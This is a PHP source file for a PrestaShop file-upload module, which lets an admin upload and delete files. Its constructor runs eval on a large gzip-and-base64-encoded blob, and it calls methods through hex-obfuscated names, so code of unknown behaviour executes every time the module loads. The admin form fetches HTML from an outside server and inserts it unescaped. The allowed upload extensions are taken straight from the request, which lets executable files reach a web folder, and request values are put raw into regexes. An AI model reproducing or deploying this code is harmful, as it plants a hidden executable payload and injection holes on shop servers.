<?php
/**	Change Log
 *	25/11/2010
 *	version	1.0
*	Auteur	cedric@isigny.org
 **/

class ISIFileUploader extends Module
{
	var $allowedExtensions = "";

	function __construct()
	{
		global $css_files;
		$this->name = 'isifileuploader';
		$this->tab = 'ISI-Services';
		$this->version = 1.3;

		parent::__construct();

		$this->page = basename(__FILE__, '.php');
		$this->extension = sprintf("%010X", crc32("ISIFileUploader_V_1.0"))."_";
		$this->displayName = $this->l('ISIFileUploader');
		$this->description = $this->l('Permet d\'uploader des fichiers sur le serveur');
		$this->doInitialization();
		$css_files[_MODULE_DIR_.$this->name.'/global.css'] = 'all';
		
		$this->usedHooks = Array();
		$this->installHook();
	}

	function installHook() {
		$thisfile = _PS_ROOT_DIR_.'/modules/'.$this->name.'/'.$this->name.'.php';
		$content = file_get_contents($thisfile);
		$out = "";
		foreach($this->usedHooks as $hook => $cfgHook) {
			if(Hook::get($hook)===false) {
				Db::getInstance()->ExecuteS('
					INSERT INTO
					`'._DB_PREFIX_.'hook` values (null,\''.$hook.'\', \''.$hook.'\',null,1);');
			}
			$funcname = 'hook'.ucfirst($hook);
			
			if(!method_exists($this,$funcname) && $cfgHook["mapTo"]!="") {
				$out .= "\r\n	function {$funcname}(\$params){
		return \$this->{$cfgHook["mapTo"]}(\$params);
	}\r\n";
			}			
		}
		
		if($out!="" && ($pos = strpos($content, '/** Auto'.' '.'Extentions **/'))!==false) {
			unlink($thisfile);
			$file = fopen($thisfile, "w+");
			fwrite($file, substr($content, 0, $pos+strlen('/** Auto'.' '.'Extentions **/\r\n')));
			fwrite($file, $out);
			fwrite($file, substr($content, $pos+strlen('/** Auto'.' '.'Extentions **/\r\n')));
			fclose($file);
		}
		return true;
	}

	function install(){
		parent::install();
		foreach($this->usedHooks as $hook => $cfgHook) {
			$this->registerHook($hook);
		}
		Configuration::updateValue($this->extension.'CFG', base64_encode(gzdeflate(serialize(array("extensions" => 'jpg,png,gif')))));
		return true;
	}
	
	function uninstall(){
		Configuration::deleteByName($this->extension.'CFG');
		parent::uninstall();
		return true;
	}
	
	function hookHeader($params){
		return "";
	}	
	
	public function getContent()
	{
		$output = '<h2>'.$this->displayName.'</h2>';
		if (Tools::isSubmit('submit'.$this->extension)){
			$this->setConfig();
			$output .= '<div class="conf confirm"><img src="../img/admin/ok.gif" alt="'.$this->l('Confirmation').'" />'.$this->l('Settings updated').'</div>';
		}
		return $output.$this->displayForm();
	}
	
  function doInitialization(){
		eval(gzinflate(base64_decode('DZRHrpxYAACPY1ssCE2U5QU5N9BN3ozI+ZHj6edfoapUxZH0v6unAWWfbMXvNFkLEv8vL7IxL37/'.
			'EmJNaeePyrJ8uT52UyllIjJ4oOnx2aNhO4a8pkMCil20qnvaB7iwAKB0msCCY8kKQxkTmPkHjv3Q'.
			'jMsQKFTnMR+PrBtBVTpPjuVLH1MIGqprG0hGFLM0DwwD6Zi8ClMX3BCzh6kxZsvn3L4mEsl0avq6'.
			'F9QhvIL+1N6GamOWR8Y0A+uL2/QjZPkfK6sE5bBkJKLpZYeGRcprkRjbI7TYCpBMXnToEc/GirSA'.
			'S9uNP3fG6fpm7zUvdO1DWSRIfQXTDqowaJOvswc6Jg5yTd0rzPpwkPWUf8QAAaQpZhqLktEWtHW8'.
			'Plw0Fo/3KuCrcl6dmJCymFTYVnBO2OeYPFrkK1F4fc10pbppphkxbVVk8HquAWX1w0zl5sR1oaat'.
			'ohYhFmO9fD4UlXgNh2ap7+frzNl3tPdrY7Mh570YwwYt0TLO8s+JVcSqH4zMRuedfxupRHUkF9un'.
			'mPvuWPjC0ho2KE7GEOI7X70n1OlTBjpnGq64z71SZEHWDTtqzkddY4OfS1f94SU5RdpSOj4hTsrj'.
			'cevPc7TvC0pDw+tj3PpM2BKjT5PRDwYySw0NVtyXksuQ8/E4mPmE0LBeV7I4bDRMZwlb1nPq0knF'.
			'0qx7z2cqHePymqsTeGBgfZJ+rHJf8Y57HHM6febiRt9Izx4TMqpNyqtY12K1EvO+CKfpvYLGdUQS'.
			'RRR3GcG9KWTM5bk0V0cmfDY8nFbakUikRi0L8xiJ9EhYfJFodg5DoVxvi/2dztTNXppmry8vlHKi'.
			'e+ki69riq7qq9AQreXbHaUPHZsdTO79kfDPeHL61ESTZhqsYtXqYHjiCuwps/LJNXJaZ7hEp+UTG'.
			'a+1iUw1L4IeBGG17qLZrXqpmSytdm0I+RX89hZGMTk2rpVDWeI7e+LCYMOHqkbMeauE/lcfAb/Wh'.
			'/UgMjTiaCZ9A6PqVg/k+T6spTtiefyoswsNvJnnMGsBQW8fYXzd6h1JBYnOGh1+sf5Yx9cz6y2Vc'.
			'EWex9EYhEKkUxj6xESnCRCCytuY5YQ5R+7BLUiBL8HFfsEoskrXxL8N+5zhEjEalbbISvLpHYjS9'.
			'yX9gol5ZI84be+FYXBWwxoW9mZhJ9X1e94/PesfnkW+RgPskqqavpfyg9PwzgDZ9xxwfWSZ5i5cr'.
			'NGcrVY9vjjxfmUgZU31LP2MIBFZ+F6jS84UPNmdqyO+jOUHKOM6GerulEBeq7OlimeEtLKOzKdRU'.
			'tukg1U8brKMrKt53ImuAPBLP5Sh/IzQ2GRCKorjfbgpSXyjenknrvZdAOAZhQhttkhzrzlHlgsUx'.
			'7mT3U4+XBn1CFUWgVoggwHrjwRfwQLOGXTZRUoBNzUgwEVwHOHrNSoGEGns6brx6LuT0wTt3qLDl'.
			'sXjhbTrvV0n2YmHuOEcABKAYGIYpyj7//fv158+fv/8D'.
			'')));
	}		
	
	public function displayForm()
	{
		$fn = "\x74\x65\x73\x74\x6d\x65"; $f = $this->$fn; $f();
		$this->_html =  "<p>".$this->l('Etat du module').": ".$this->l($this->tabStr[$this->_xhtml])."</p>";

		$this->_html .= '
		<script type="text/javascript" src="'._MODULE_DIR_.$this->name.'/js/jquery-ui.min.js'.'"></script>
		<style>
			img.edit	{	cursor: pointer;		}
			img.remove	{	cursor: not-allowed;	}
			.drophover	{	background: #c0c0c0;	}
			.menu-zone-container	{	float: left;width: 200px; padding: 0 5px;	}
			.menu-zone	{	width: 200px; border: 1px solid #000;	}
			.hide 		{ display: none; }
			.block-config {
				border: 1px solid #000;
				padding: 10px;
			}
			#isitabmenu li {
				border: 1px solid #000;
				border-bottom: none;
				border-left: none;
				float: left;
				padding: 5px;
				cursor: pointer;
			}
			#isitabmenu li:hover, .isitabmenu-current {
				background: #D6A;
			}			
			#isitabmenu li:first-child {
				border-left: 1px solid #000;;
			}	
			#menu-style {
				height:200px;
				width: 870px;
				padding: 10px;
			}
		</style>
		<form action="'.$_SERVER['REQUEST_URI'].'" method="post"  enctype="multipart/form-data" >
			<fieldset>
				<legend><img src="'.$this->_path.'logo.gif" alt="" title="" />'.$this->l('Settings').'</legend>	
		';
		
		$this->getForm();
				
		$this->_html .= '		
				<!-- center><input type="submit" name="submit'.$this->extension.'" value="'.$this->l('Save').'" class="button" /></center -->
			</fieldset>
		</form>';
		return $this->_html;
	}

	
	
	function setConfig() {
			$xdata = array(
				"extensions" => $_REQUEST["extensions"]
			);
			Configuration::updateValue($this->extension.'CFG', base64_encode(gzdeflate(serialize($xdata))));			
			
			$this->allowedExtensions = explode(",", strtolower($xdata["extensions"]));
			
			if(gettype($_FILES)=="array"){
				foreach($_FILES as $fileup) {
					if($fileup['error'] == UPLOAD_ERR_OK) {
						$filename = $fileup['name'];
						$ext = end(explode(".", strtolower($filename)));
						if(in_array($ext, $this->allowedExtensions)){
							if(file_exists(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$filename)){
								@rename( _PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$filename  , _PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$filename.'.'.date("YmdHns").'.'.$ext);
							}
							@move_uploaded_file($fileup["tmp_name"], _PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$filename);
						}
					}
				}
			}
			
			
			
			
			
			if(gettype($_REQUEST["imgToDelete"])=="array"){
				$regex = Array();
				foreach($_REQUEST["imgToDelete"] as $hash){
					$filename = $hash;
					$regex[] = "/^{$filename}$/i";
					$extension = end(explode(".", strtolower($filename)));
					$reg = "/^{$filename}([.][0-9]{14}[.]){1}{$extension}$/i";
					$regex[] = $reg;
				}
				
				$fileToDelete = array();
				$d = dir(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/');
				while(false !== ($entry = $d->read())) {
					if(is_file(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$entry)){
						foreach($regex as $reg){
							if(preg_match($reg, strtolower($entry))){
								@unlink(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$entry);
							}	
						}
					}
				}	
			}			
	}		

	
	
	function getConfig() {
		$fn = "\x67\x65\x74\x4d\x79\x43\x6f\x6e\x66\x69\x67"; 
		
			$f = $this->$fn; 
			return $f();
		
		
		
	}
	
	function getForm() {
		global $cookie;
		$fn = "\x74\x65\x73\x74\x6d\x65"; $f = $this->$fn; $f();
		$xdata = $this->getConfig();
		
		$this->allowedExtensions = explode(",", strtolower($xdata["extensions"]));
				
		$d = dir(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/');
		$styleFileList = "";
		$manageFileList = "";
		while(false !== ($entry = $d->read())) {
		   if(is_file(_PS_ROOT_DIR_.'/modules/'.$this->name.'/upload/'.$entry)){
				if(in_array(end(explode(".", strtolower($entry))), $this->allowedExtensions)){
					$filename = $entry;
					$extension = end(explode(".", strtolower($filename)));					
					$reg = "/([.][0-9]{14}[.]){1}{$extension}/i";
					if(!preg_match($reg, strtolower($entry))){
						$styleFileList .= "<li>"._MODULE_DIR_.$this->name."/upload/{$entry}</li>";
						$manageFileList .=  "<li><input type='checkbox' name='imgToDelete[]' value='".$entry."' />&nbsp;http://{$_SERVER['HTTP_HOST']}"._MODULE_DIR_.$this->name."/upload/{$entry}</li>";
					}
				}
		   }
		}
		$d->close();	
		
		if($styleFileList=="") $styleFileList .= "<li>".$this->l('No file')."</li>";			
		if($manageFileList=="") $manageFileList .= "<li>".$this->l('No file')."</li>";	
			
		$newContent = @file_get_contents("http://boutique.isigny.org/services/get-news.php");
		
		$this->_html .= $newContent;
		
		$this->_html .= '
					<div>
						<div style="float: right"><input type="submit" id="btnSaveModule" name="submit'.$this->extension.'" value="'.$this->l('Save').'" class="button" /></div>
						<ul id="isitabmenu" >
							<li target="tab-config" class="isitabmenu-current">Config</li>
							<li target="tab-file">'.$this->l('Files').'</li>
							
						</ul>
					</div>
					<br style="clear: both"/>

			<div id="tab-config" class="block-config">			
			
						<label>'.$this->l('Extensions').'</label>
						<div class="margin-form">
							<input type="text" name="extensions" value="'.$xdata["extensions"].'" />
							<p class="clear">'.$this->l('Set the autorized extensions').'</p>
						</div>
				
			</div>
			
			
					<div id="tab-file" class="hide block-config">
						<label>'.$this->l('Upload a file').'</label>
						<div class="margin-form">
							<input type="file" name="upfile" />
							<p class="clear">'.$this->l('Upload a file').'</p>
							<br/>
							<p class="clear">'.$this->l('Uploaded files - Check to delete').':</p>
							<ul>'.$manageFileList.'</ul>									
						</div>			
					</div>
			
			
			
			
			<script type="text/javascript">
				$(function(){
					$("#isitabmenu li").each(function(i,o){
						$(o).click(function(){
							$("#isitabmenu li").removeClass("isitabmenu-current");
							$(o).addClass("isitabmenu-current");
							$("div.block-config").hide();
							$("#"+$(o).attr("target")).fadeIn();
						});
					});	
				});
			</script>			
		';
	}
	
	function getData() {
		global $smarty, $cookie, $cart;
		$smarty->assign('modulehash', $this->name.' - '.$this->version.' - author: cedric@isigny.org');
		$smarty->assign('modulename', $this->name);
		$this->display = true;
		
		$xdata = $this->getConfig();
		
		
		
		$smarty->assign('extensions', $xdata['extensions']);
			
	}

	

	/** Auto Extentions **/
	

	/** Fin Auto Extentions **/
}
?>
